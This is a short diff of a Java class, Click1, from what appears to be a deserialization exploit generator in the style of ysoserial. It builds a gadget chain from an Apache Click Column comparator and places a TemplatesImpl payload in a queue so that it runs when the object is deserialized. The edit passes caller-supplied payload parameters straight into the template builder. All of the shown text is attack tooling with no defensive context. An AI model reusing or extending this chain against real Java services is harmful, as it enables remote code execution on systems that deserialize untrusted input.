@@ -23,8 +23,6 @@ public class Click1 {
     }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-        String command = String.valueOf(type);
-
         // prepare a Column.comparator with mock values
         final Column column = new Column("lowestSetBit");
         column.setTable(new Table());
@@ -43,7 +41,7 @@ public class Click1 {
         // finally, we inject and new TemplatesImpl object into the queue,
         // so its getOutputProperties() method will be called
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        final Object   templates  = Gadgets.createTemplatesImpl(PayloadType.valueOf(command));
+        final Object   templates  = Gadgets.createTemplatesImpl(type, param);
         queueArray[0] = templates;
 
         //序列化
